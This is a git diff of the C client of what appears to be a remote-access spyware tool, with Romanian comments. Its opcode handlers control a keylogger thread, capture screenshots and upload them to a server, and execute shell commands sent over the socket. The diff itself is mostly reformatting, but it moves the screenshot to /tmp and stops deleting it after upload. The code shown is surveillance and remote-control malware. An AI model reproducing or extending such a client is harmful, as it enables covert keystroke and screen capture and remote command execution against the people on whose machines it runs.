@@ -47,6 +47,7 @@ void connectionInitialize(int *sock)
 void startingDataInitialize()
 {
     // Trimite Date despre Utilizator--------------------
+    printf("Opening file %s\n", CLIENT_CONFIG_FILE);
     int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
     if (fd < 0)
     {
@@ -95,7 +96,7 @@ void handleKeyLoggerOpcode()
     if (clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
     {
         pthread_cancel(clientData.keyLoggerTid);
-         //close(clientData.keyLoggerInputFile);
+        // close(clientData.keyLoggerInputFile);
         message_t msg;
         msg.opCode = 'K';
         strcpy(msg.buffer, "STOP");
@@ -125,7 +126,7 @@ void handleScreenshotOpcode()
     sendMessage(clientData.serverSocket, &msg);
 
     char filename[BUFFER_SIZE];
-    strcpy(filename, "screenshotTmp.jpg");
+    strcpy(filename, "/tmp/screenshotTmp.jpg");
 
     pid_t pid = fork();
 
@@ -149,20 +150,20 @@ void handleScreenshotOpcode()
     printf("File created. sending file...\n");
     sendFile(clientData.serverSocket, filename);
 
-    remove(filename);
+    // remove(filename);
 }
 
-void expandTilde(char ** args)
+void expandTilde(char **args)
 {
-    for(int i = 0; args[i] != NULL; i++)
+    for (int i = 0; args[i] != NULL; i++)
     {
-        if(args[i][0] == '~')
+        if (args[i][0] == '~')
         {
-            const char* user = getenv("SUDO_USER");
+            const char *user = getenv("SUDO_USER");
             struct passwd *pw = getpwnam(user);
-            const char* home = pw->pw_dir;
-            
-            char* expanded = malloc(strlen(home) + strlen(args[i]));
+            const char *home = pw->pw_dir;
+
+            char *expanded = malloc(strlen(home) + strlen(args[i]));
             sprintf(expanded, "%s%s", home, args[i] + 1);
             args[i] = expanded;
         }
@@ -176,18 +177,18 @@ void handleCommandOpcode(message_t msg)
     if (pid == 0)
     {
         int argCount = 0;
-        char*temp = strdup(msg.buffer);
-        char*p = strtok(temp, " ");
-        while(p)
+        char *temp = strdup(msg.buffer);
+        char *p = strtok(temp, " ");
+        while (p)
         {
             argCount++;
             p = strtok(NULL, " ");
         }
         free(temp);
-        char**args = (char**)malloc((argCount + 1) * sizeof(char*));
+        char **args = (char **)malloc((argCount + 1) * sizeof(char *));
         int i = 0;
         p = strtok(msg.buffer, " ");
-        while(p)
+        while (p)
         {
             args[i++] = p;
             p = strtok(NULL, " ");
@@ -213,7 +214,6 @@ void handleCommandOpcode(message_t msg)
     }
 }
 
-
 void handleOpcode(message_t msg)
 {
     switch (msg.opCode)
@@ -224,7 +224,7 @@ void handleOpcode(message_t msg)
     case 'S':
         handleScreenshotOpcode();
         break;
-    case 'C':                           ///////De adaugat si in Obsidian
+    case 'C': ///////De adaugat si in Obsidian
         handleCommandOpcode(msg);
         break;
     }
